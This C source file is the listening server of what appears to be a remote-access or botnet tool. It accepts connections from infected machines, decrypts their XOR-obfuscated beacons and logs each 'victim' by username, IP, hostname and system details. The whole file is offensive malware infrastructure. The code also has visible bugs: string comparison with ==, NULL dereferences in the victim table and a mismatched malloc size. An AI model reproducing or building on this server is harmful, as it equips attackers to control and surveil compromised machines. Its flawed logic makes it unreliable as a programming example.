/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include "../net.h"
#include "../crypt.h"
#include "../defs.h"

#ifndef NET_MAX_CLIENTS
#define NET_MAX_CLIENTS 128
#endif

net_client_beacon_t *p_victims[NET_MAX_CLIENTS];

int net_get_victim_count(){
  int n_victims = 0;
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] != NULL){
      n_victims++;
    }
  }
  return n_victims;
}

int net_set_victim(net_client_beacon_t *p_victim){
  /*
    :TODO: set pointer to current victims client beacon
    :p_victim: pointer to victim client beacon
    :returns: -1 on failure and element index on success
 */
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i]->sysinfo.username == p_victim->sysinfo.username &&
         p_victims[i]->sysinfo.ip == p_victim->sysinfo.ip){
      // update victim data
      p_victims[i] = p_victim;
      return i;
    }
  }
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] == NULL){
      p_victims[i] = p_victim;
      printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n",
             p_victims[i]->sysinfo.username,
             p_victims[i]->sysinfo.ip,
             p_victims[i]->sysinfo.hostname,
             p_victims[i]->sysinfo.arch,
             p_victims[i]->sysinfo.release,
             p_victims[i]->sysinfo.cpu_usage);
      return i;
    }
  }
  fprintf(stderr, "[-] net_victims_max limit reached\n");
  return -1;
}

bool net_remove_victim(net_client_beacon_t *p_victim){
  /*
    :TODO: remove victim from list
    :p_victim: pointer to victim struct
    :returns: boolean
  */
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i]->sysinfo.username == p_victim->sysinfo.username &&
        p_victims[i]->sysinfo.ip == p_victim->sysinfo.ip){
      memset(p_victims[i], 0, sizeof(net_client_beacon_t));
      return true;
    }
  }
  fprintf(stderr, "[-] failed to remove victim from p_victims\n");
  return false;
}

bool net_start_server(int port){
  /*
    :TODO: start listening server
    :port: (int) server listening port
    :returns: (bool)
  */
  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
    fprintf(stderr, "[x] server port is invalid\n");
    return false;
  }

  int server_fd, client_fd, err;
  struct sockaddr_in server, client;
  pid_t child_pid;

  // setup socket
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd < 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  // allow easy restart of server
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0){
    fprintf(stderr, "[-] %s\n", strerror(errno));
  }

  // set server properties
  memset(&server, 0, sizeof(server));
  server.sin_family      = AF_INET;
  server.sin_port        = htons(port);
  server.sin_addr.s_addr = htonl(INADDR_ANY);

  // bind to socket
  err = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
  if (err < 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  printf("[+] bind to port %d\n", ntohs(server.sin_port));

  // clear out p_victims array
  memset(p_victims, 0, sizeof(p_victims));

  // setup listeners and max number of clients
  if (listen(server_fd, NET_MAX_CLIENTS)  == 0){
    printf("[*] listening...\n");
  } else{
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }
  
  while (true){
    // accept client connection
    socklen_t client_len = sizeof(client);
    client_fd = accept(server_fd, (struct sockaddr *) &client, &client_len);
    if (client_fd < 0){
      return false;
    }
    if ((child_pid = fork()) == 0){
      net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
      net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
      while (true){
        close(server_fd);
        int read = recv(client_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
        if (!read){
          break;
        }
        if (read < 0){
          fprintf(stderr, "[-] %s:%d read failed\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
          return false;
        }
        crypt_decrypt_xor((void *)p_net_client_beacon, sizeof(net_client_beacon_t), DEFS_XOR_KEY);
        net_set_victim(p_net_client_beacon);
        fflush(stdout);
        p_net_server_beacon->xor_key = DEFS_XOR_KEY;
        p_net_server_beacon->status = true;
        crypt_encrypt_xor((void *)p_net_server_beacon, sizeof(net_server_beacon_t), DEFS_XOR_KEY);
        if (send(client_fd, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
          fprintf(stderr, "[x] %s\n", strerror(errno));
          return false;
        }
        memset(p_net_server_beacon, 0, sizeof(net_server_beacon_t));
      }
      printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n",
             p_net_client_beacon->sysinfo.username,
             p_net_client_beacon->sysinfo.ip,
             p_net_client_beacon->sysinfo.hostname,
             p_net_client_beacon->sysinfo.arch,
             p_net_client_beacon->sysinfo.release,
             p_net_client_beacon->sysinfo.cpu_usage);
      net_remove_victim(p_net_client_beacon);
    }
  }
  close(client_fd);
  return true;
}
